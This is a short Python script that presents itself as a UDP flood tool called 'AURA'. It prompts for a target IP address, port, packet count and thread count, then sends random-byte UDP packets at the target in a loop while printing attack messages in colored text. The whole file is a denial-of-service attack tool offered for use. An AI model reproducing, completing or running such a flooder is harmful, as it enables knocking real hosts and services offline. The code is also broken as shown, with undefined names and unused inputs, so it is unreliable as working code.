#!/usr/bin/env python3
import threading
import sys
import random
import struct
import socket
import codecs
import os
import time

os.system("clear")
print("""\033[91m
     _   _   _ ____      _    
    / \ | | | |  _ \    / \   
   / _ \| | | | |_) |  / _ \  
  / ___ \ |_| |  _ <  / ___ \ 
 /_/   \_\___/|_| \_\/_/   \_\
                              """)
print("""\033[96m
          MADE WITH CODE
          BY AURA X AxeL
           Don't ABUSE
""")

ip = str(input("\033[94m====> $ IP   : "))
port = int(input("====> $ PORT   : "))
times = int(input("====> $ PACKET   : "))
threads = int(input("====> $ KIRIM THREADS  : "))

def attack(ip, port, time, size):



    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(65535, port))
    print(brand)
    print("\033[95m★★★★ PACKET TERKIRIM! ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    size = os.urandom(min(666, size))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or random.randint(1, 65535)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(size, (ip, port))

    print('\033[92mAttack Finished')
    os.system("clear")

if __name__ == '__main__':
    try:
        attack(ip, port, time, size)
    except KeyboardInterrupt:
        print('Attack stopped.')
